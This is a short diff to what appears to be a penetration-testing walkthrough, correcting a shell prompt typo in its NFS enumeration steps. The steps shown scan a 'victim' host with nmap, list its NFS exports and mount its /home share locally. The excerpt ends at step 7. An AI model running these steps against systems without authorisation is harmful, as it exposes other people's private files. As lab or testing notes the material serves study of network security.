@@ -34,7 +34,7 @@ You should see port 2049 open after scanning
 1. attacker@parrot:~#sudo nmap -sV [IP]
 2. Do this manually nfs enumerate 
 3. attacker@parrot:~# apt-get install nfs-common 
-4. attacker@parrot:~:showmount -e [IP Addrr]) or attacker@parrot:~#sudo nmap -sV --script=nfs-showmount [victim IP]
+4. attacker@parrot:~#showmount -e [IP Addrr]) or attacker@parrot:~#sudo nmap -sV --script=nfs-showmount [victim IP]
 5. attacker@parrot:~#mkdir  /tmp/nfs
 6. attacker@parrot:~#sudo mount -t nfs [IP]:/home  /tmp/nfs
 7. attacker@parrot:~#cd  /tmp/nfs
